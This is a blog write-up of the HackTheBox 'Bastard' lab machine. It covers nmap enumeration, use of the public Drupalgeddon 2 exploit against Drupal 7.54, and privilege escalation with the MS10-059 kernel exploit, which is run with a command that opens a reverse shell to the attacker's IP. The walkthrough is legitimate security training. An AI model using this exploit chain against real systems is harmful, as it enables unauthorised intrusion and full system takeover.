---
title: "HTB - Bastard without MetaSploit"
date: 2021-03-03
categories: ["hacking", "write-ups"]
tags: [HTB]
featuredImage: "/images/2021/03/Bastard_Logo.png"
---
## Intro
Let's up the game a little bit and attack a medium rated box for the very first time!

## Target
[HTB - Bastard](URL)

## Recon
A quick look to the box info reveals :

* Windows box ;
* Misc : php, web, patch management.

I assume this will be about an outdated PHP application running under Windows.

## Enum
We run our classic `nmap` scan :

```text
sudo nmap -T4 -A -p- -oA scan $target_ip
```
```text
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 12:23 CET
Nmap scan report for bastard.htb (10.129.90.188)
Host is up (0.024s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   23.34 ms 10.10.14.1
2   23.46 ms bastard.htb (10.129.90.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.23 seconds
```

We also run our team of usual's suspects tools, such as `nikto` and `gobuster` and manually `browsing` with `Burp` enabled.

We'll notice a `Drupal 7.54` installation which is vulnerable to [Drupalgeddon 2](https://github.com/dreadlocked/Drupalgeddon2) :

![Bastard Drupal Version](/images/2021/03/Bastard_Drupal_Version.png)

## Exploitation

### Getting Initial Shell
Manually exploiting the vuln with the ruby script found during our recon will give us an initial shell as `authority\iusr` :

![Bastard Initial Shell](/images/2021/03/Bastard_Initial_Shell.png)

It is now time for internal recon, before we try to escalate our privs!

### PrivEsc
Since our shell is quite limited, we'll have to find several to get what we want. For example, running winpeas and similar tools won't work. It will time out before we can get the results, and I couldn't find a way to write the output to a logfile.

After searching, I found [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). It is a `python2 script` that works on my attacking machine from the output of the `systeminfo` command :

![Bastard Potential Vulns](/images/2021/03/Bastard_Potential_Vulns.png)

So going down the list I found one kernel exploit that seemed particularly interesting : [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059).

Once uploaded, just run it without argument and it'll tell you that it requires an IP and port, in order to pop a reverse shell.

So I ran it like so :

```text
MS10-059.exe "$attacking_ip" "1234"
```

Hopefully, it worked and gave me `SYSTEM` :

![Bastard Root Shell](/images/2021/03/Bastard_Root_Shell.png)

Harvest flag and call it a day :

![Bastard Root Flag](/images/2021/03/Bastard_Root_Flag.png)


## Outro
This has been my first even "medium" rated box and I am very happy I did it on my own. I found this initial shell pretty easy, but then got quite confused when I couldn't work with `winpeas` and other executables. This is when I started researching for other way to enum the box and found the `python exploit suggester`. From, here it was some googling and mor trial and error, but it worked!